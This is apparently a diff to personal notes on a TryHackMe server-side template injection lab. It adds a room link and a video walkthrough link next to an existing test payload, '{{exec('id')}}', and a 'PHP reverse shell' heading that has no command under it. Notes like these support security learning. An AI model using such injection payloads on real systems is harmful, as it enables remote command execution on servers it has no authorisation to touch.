@@ -1,3 +1,5 @@
+tryhackme room: https://tryhackme.com/r/room/serversidetemplateinjection
+Youtube video walk through for Server-side Template Injection https://youtu.be/t-plhN3riO8
 PHP reverse shell used:
 test: {{exec('id')}}
 shell:
